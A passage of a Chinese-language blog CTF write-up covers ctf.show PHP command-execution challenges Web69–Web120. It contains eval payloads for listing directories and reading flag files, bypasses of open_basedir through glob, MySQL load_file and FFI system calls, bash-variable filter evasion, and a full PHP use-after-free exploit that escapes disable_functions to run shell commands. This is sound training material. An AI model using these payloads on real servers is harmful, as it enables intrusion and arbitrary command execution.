+<p>？？？？？？？？？？？？？？？</p>
+<p>也就是说没源码看了是吧，好好好，但是大概率是因为把highlight_file ban了</p>
+<p>所以可以使用一下以下方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web69-70"><a href="#Web69-70" class="headerlink" title="Web69-70"></a>Web69-70</h4><p>还是和上一题一样的，warning，笑死</p>
+<p>所以尝试一下上一题payload，发现过滤了var_dump</p>
+<p>所以可以尝试以下方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>var_export函数使用方式和var_dump差不多</p>
+<h4 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h4><p>一定要去看看提示，直接写会看蒙掉的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>重点放在两个不认识的函数上</p>
+<p>ob_get_contents();&#x2F;&#x2F;得到缓冲区的数据。<br>ob_end_clean();&#x2F;&#x2F;会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</p>
+<p>方法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>发现输出的一大堆问号，原来是源码中用函数将缓冲区的所有字符全部替换为问号，那么可以用exit()&#x2F;die()提前结束，这样就不会将字符替换为问号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit();</span><br><span class="line">c=include(&quot;/flag.txt&quot;);die();</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://64fe58eb-5766-484d-b8db-bd1f4b3ab1c2.chall.ctf.show/&quot;</span><br><span class="line"></span><br><span class="line">d = &#123;&#x27;c&#x27;: &#x27;include(&quot;/flag.txt&quot;);echo ~ob_get_contents();&#x27;&#125;</span><br><span class="line">s = requests.post(url, d).content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">    print(chr(~i&amp;0xff), end=&#x27;&#x27;)</span><br><span class="line"># 脚本来自群大佬阿狸</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
+
+<p>存在open_basedir，利用glob伪协议在筛选目录是不受open_basedir制约</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo $f.&quot;    &quot; ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">exit();</span><br></pre></td></tr></table></figure>
+
+<p>发现</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240611170631533.png" alt="image-20240611170631533"></p>
+<p>之后我们需要绕过open_dir和disable_function</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php</span><br><span class="line">pwn(&quot;ls /;cat /flag0.txt&quot;);</span><br><span class="line"> </span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace(); # ;)</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&#x27;%c&#x27;,$ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&#x27;%c&#x27;,$v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"> </span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"> </span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"> </span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"> </span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;constant&#x27; constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"> </span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;bin2hex&#x27; constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"> </span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"> </span><br><span class="line">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line">        # str_shuffle prevents opcache string interning</span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    $n_alloc = 10; # increase this value if UAF fails</span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"> </span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"> </span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    # leaks</span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"> </span><br><span class="line">    # fake value</span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"> </span><br><span class="line">    # fake reference</span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"> </span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"> </span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    # fake closure object</span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    # pwn</span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class="line"> </span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在bp中抓包上传得到flag</p>
+<h4 id="Web73-74"><a href="#Web73-74" class="headerlink" title="Web73-74"></a>Web73-74</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure>
+
+<p>glob:</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240611211039660.png" alt="image-20240611211039660"></p>
+<p>在此处是作为一个读取协议存在</p>
+<p>而&#x2F;*则代表了遍历文件</p>
+<p>方法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit(); //发现根目录下有flagc.txt</span><br><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit();</span><br></pre></td></tr></table></figure>
+
+<p>即先通过前者找到所需文件</p>
+<p>之后再通过include读取文件</p>
+<p>方法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php    //前面的?&gt;用来闭合&lt;?</span><br><span class="line">	$a=new DirectoryIterator(&quot;glob:///*&quot;);   //php使用glob遍历文件夹</span><br><span class="line">	foreach($a as $f) </span><br><span class="line">	&#123;</span><br><span class="line">		echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">	&#125; </span><br><span class="line">	exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用数组遍历的方式遍历所有文件</p>
+<h4 id="Web75-76"><a href="#Web75-76" class="headerlink" title="Web75-76"></a>Web75-76</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-</span><br><span class="line">&gt;__toString().&#x27;&#x27;);&#125;exit(0);?&gt;</span><br><span class="line">#通过payload扫描 flag36.txt</span><br></pre></td></tr></table></figure>
+
+<p>所以来扫描吧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line"> </span><br><span class="line">try &#123;</span><br><span class="line">    $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">        &#x27;root&#x27;);</span><br><span class="line"> </span><br><span class="line">    foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;</span><br><span class="line">        echo ($row[0]) . &quot;|&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>sql语句来绕过open_basedir和disable_function</p>
+<h4 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h4><ul>
+<li>命令执行最后一题，php7.4，基本上命令执行就告一段落了</li>
+</ul>
+<p>php7.4有什么玄机吗？</p>
+<p>FFI：</p>
+<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术</p>
+<p>所以我们可以通过system函数将flag写进一个新的文本中，然后访问文本</p>
+<p>方法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//首先是熟悉的确定flag位置和名称</span><br><span class="line">c=?&gt;&lt;?php </span><br><span class="line">	$a=new DirectoryIterator(&quot;glob:///*&quot;); </span><br><span class="line">	foreach($a as $f) </span><br><span class="line">	&#123; </span><br><span class="line">		echo($f-&gt;__toString().&#x27;  &#x27;);</span><br><span class="line">	&#125; </span><br><span class="line">	exit();</span><br><span class="line">?&gt;</span><br><span class="line">//FFI调用system函数</span><br><span class="line">c=</span><br><span class="line">$ffi=FFI :: cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);</span><br><span class="line">exit();</span><br><span class="line">//访问1.txt</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo $f.&quot;    &quot; ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    &quot;int system(const char *command);&quot;);</span><br><span class="line"></span><br><span class="line">$ffi-&gt;system(&quot;/readflag &gt; 1.txt&quot;);</span><br><span class="line"></span><br><span class="line">exit();</span><br><span class="line">//访问1.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web118"><a href="#Web118" class="headerlink" title="Web118"></a>Web118</h4><p><strong>事先了解一下：</strong><br><a target="_blank" rel="noopener" href="https://blog.51cto.com/allenh/1695810">Linux 基础知识：Bash的内置变量</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_0">常见 Bash 内置变量介绍</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@baba:~# echo $&#123;PWD&#125;</span><br><span class="line">/root</span><br><span class="line">root@baba:~# echo $&#123;PWD:1:1&#125;   //表示从第2（1+1）个字符开始的一个字符</span><br><span class="line">r</span><br><span class="line">root@baba:~# echo $&#123;PWD:0:1&#125;   //表示从第1（0+1）个字符开始的一个字符</span><br><span class="line">/</span><br><span class="line">root@baba:~# echo $&#123;PWD:~0:1&#125;  //表示从最后一个字符开始的一个字符</span><br><span class="line">t</span><br><span class="line">root@baba:~# echo $&#123;PWD:~A&#125;    //字母代表0</span><br><span class="line">t</span><br></pre></td></tr></table></figure>
+
+<p>所以本题可以通过该方式绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure>
+
+<p>${PATH:~A}即为n，因为${PATH}通常为bin</p>
+<p>${PWD:~A}即为l，因为${PWD}应为var&#x2F;www&#x2F;html</p>
+<p>所以构成了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nl ????.???</span><br></pre></td></tr></table></figure>
+
+<p>可以用来读取文件</p>
+<h4 id="Web119-120"><a href="#Web119-120" class="headerlink" title="Web119-120"></a>Web119-120</h4><p>多过滤了一个path</p>
+<p>方法一：</p>
+<p>构造&#x2F;bin&#x2F;base64 flag.php</p>
+<p>只需要构造&#x2F;和4即可，其他均可用通配符替代</p>
+<p><strong>SHLVL</strong></p>
+<p>是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}&#x3D;1，然后在此shell中再打开一个shell时$SHLVL&#x3D;2。</p>
+<p><strong>RANDOM</strong></p>
+<p>此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。</p>
+<p>所以我们只需要<code>$&#123;PWD::$&#123;SHLVL&#125;&#125;</code>，结果就是&#x2F;</p>
+<p>4的问题，可以用$ $</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
